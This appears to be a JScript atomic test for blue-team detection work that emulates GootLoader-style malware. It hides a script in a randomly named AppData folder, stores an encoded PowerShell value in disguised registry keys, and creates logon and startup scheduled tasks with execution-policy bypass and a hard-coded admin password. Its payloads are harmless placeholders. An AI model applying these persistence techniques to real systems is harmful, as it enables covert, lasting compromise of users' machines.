// Atomics on a Friday
// Educational Purposes Only. 
// Blue Team only.


// Create WSHShell object
var WSHShell = new ActiveXObject("WScript.Shell");

// Set the destination path
var destinationPath = "C:\\Users\\" + WSHShell.ExpandEnvironmentStrings("%USERNAME%") + "\\AppData\\Roaming";

// Generate a random directory name
function randomDirectoryName(length) {
    var randomName = "";
    for (var i = 0; i < length; i++) {
        var charCode = Math.floor(Math.random() * (25 + 1) + 65);
        randomName += String.fromCharCode(charCode);
    }
    return randomName;
}

var generatedDirectoryName = randomDirectoryName(10);

// Set the hard-coded file name
var hardCodedFileName = "InflatedFile.log";

// Combine the destination path, random directory, and hard-coded file name
var fullPath = destinationPath + "\\" + generatedDirectoryName + "\\" + hardCodedFileName;

// Create the random directory if it doesn't exist
var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FolderExists(destinationPath + "\\" + generatedDirectoryName)) {
    fso.CreateFolder(destinationPath + "\\" + generatedDirectoryName);
}

// Create the inflated log file with valid JavaScript content
var file = fso.CreateTextFile(fullPath, true);
file.WriteLine("WScript.Echo('Hello, World!');");
file.Close();

// Output the full path of the created file
WScript.Echo("Inflated file created at: " + fullPath);

// Create the specified registry keys and values
var username = WSHShell.ExpandEnvironmentStrings("%USERNAME%");
var randomString = randomDirectoryName(5);
var regKeyPath1 = "HKCU\\SOFTWARE\\Microsoft\\" + randomString + "\\" + username + "0\\";
var regKeyPath2 = "HKCU\\SOFTWARE\\Microsoft\\" + randomString + "\\" + username + "\\";

WSHShell.RegWrite(regKeyPath1, "", "REG_SZ");
WSHShell.RegWrite(regKeyPath2, "", "REG_SZ");

// Create a value in these keys that is a PowerShell base64 encoded content that runs "hostname"
var powershellScript = "get-hostname";
var base64Value = WSHShell.Exec("powershell -Command \"[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('" + powershellScript + "'))\"").StdOut.ReadAll();

WSHShell.RegWrite(regKeyPath1 + "EncodedScript", base64Value, "REG_SZ");
WSHShell.RegWrite(regKeyPath2 + "EncodedScript", base64Value, "REG_SZ");

WScript.Echo("Registry keys created and values added:");
WScript.Echo(regKeyPath1 + "EncodedScript");
WScript.Echo(regKeyPath2 + "EncodedScript");

// Rename the .log file to .js
var oldFilePath = fullPath;
var newFilePath = fullPath.replace(".log", ".js");
fso.MoveFile(oldFilePath, newFilePath);

// Run the renamed .js file with WScript.exe
WSHShell.Run("WScript.exe \"" + newFilePath + "\"");

// Create a scheduled task to run the decoded PowerShell script when the user logs in
var taskName = username + "_task";
var taskDescription = "Task to run the decoded PowerShell script when the user logs in";
var taskAction = "\"powershell.exe\" \"-NoProfile\" \"-ExecutionPolicy Bypass\" \"-File\" \"" + newFilePath + "\"";
var createTaskCommand = "schtasks.exe /create /tn \"" + taskName + "\" /tr " + taskAction + " /sc onlogon /ru " + username + " /rl highest /f";
var shell = WSHShell.Exec(createTaskCommand);
while (shell.Status == 0) {
    WScript.Sleep(100);
}
var output = shell.StdOut.ReadAll();
if (output != "") {
    WScript.Echo("Failed to create scheduled task: " + output);
} else {
    WScript.Echo("Scheduled task created: " + taskName);
}

var urls = ["https://example.com", "https://microsoft.com", "https://google.com"];

function httpGet(url) {
  var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
  xhr.open("GET", url, false);
  xhr.send();

  if (xhr.status === 200) {
    WScript.Echo(xhr.responseText);
  } else {
    WScript.Echo("Request failed. Status: " + xhr.status);
  }
}

for (var i = 0; i < urls.length; i++) {
  httpGet(urls[i]);
}

function createScheduledTask(taskName, executablePath, arguments, userName, password) {
  var script = "$action = New-ScheduledTaskAction -Execute '" + executablePath + "' -Argument '" + arguments + "';" +
    "$trigger = New-ScheduledTaskTrigger -AtStartup;" +
    "$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfIdle -IdleDuration '00:10:00';" +
    "$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings;" +
    "Register-ScheduledTask -TaskName '" + taskName + "' -InputObject $task -User '" + userName + "' -Password '" + password + "';";

  var shell = new ActiveXObject("WScript.Shell");
  shell.run("powershell.exe -ExecutionPolicy Bypass -Command " + script);
}

// Example usage
createScheduledTask("GootsTASKhere", "notepad.exe", "", "attackrange\\administrator", "P@ssword1");
